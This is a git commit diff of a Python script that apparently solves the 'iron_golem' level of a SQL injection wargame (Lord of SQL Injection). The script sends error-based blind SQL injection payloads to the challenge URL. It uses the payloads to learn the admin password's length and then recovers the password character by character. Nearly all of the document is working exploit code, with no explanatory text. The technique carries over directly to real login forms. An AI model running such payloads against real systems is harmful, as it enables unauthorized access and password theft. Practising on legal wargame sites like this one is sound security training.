4823ac5d3225733b6540bbffdd605e852eecb51b
0xe82de <0xe82de@gmail.com>
2020-12-08 00:54:15 +0900

    LOS #21 clear

--- py/LOS_#21_iron_golem.py
+++ py/LOS_#21_iron_golem.py
@@ -4,7 +4,7 @@
 import requests
 
 def GetPwLength(t, s):
-    for i in range(32, 101):
+    for i in range(1, 101):
         try:
             payload = t + "?pw=' or id='admin' and if(length(pw)=" + str(i) + ", true, (select 1 union select 2))%23"
             r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
@@ -18,13 +18,13 @@ def GetPwLength(t, s):
             return i
 
 def GetPw(t, s, lengthPw):
+    tmpPw = ""
+
     for i in range(1, lengthPw + 1):
-        for j in range(32, 128):
+        for j in range(48, 128):
             try:
-                payload = t + "?pw=' or id='admin' and if(substr(pw, " + str(i) + ", 1)=" + chr(j) + ", true, (select 1 union select 2))"
-                print(payload)
+                payload = t + "?pw=' or id='admin' and if(substr(pw, " + str(i) + ", 1)=\"" + chr(j) + "\", true, (select 1 union select 2))%23"
                 r = requests.post(payload, cookies=(dict(PHPSESSID=s)))
-                print(r)
 
             except Exception as e:
                 print("GetPw Error...")
@@ -32,16 +32,18 @@ def GetPw(t, s, lengthPw):
                 exit(1)
             
             if "Subquery returns more than 1 row" not in r.text:
-                print(chr(j))
-                # 문자 비교 코드 추가
+                tmpPw += chr(j)
+                break
+
+    return tmpPw
 
 if __name__ == "__main__":
     t = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
-    session = "q23rp5u5uglel5kun9dgbqb4vk"
+    session = "" #세션값
     pw = ""
 
     lengthPw = GetPwLength(t, session)
     print("Length of Password : %d\n" %(lengthPw))
-
+    
     pw = GetPw(t, session, lengthPw)
     print("Password : %s" %(pw))
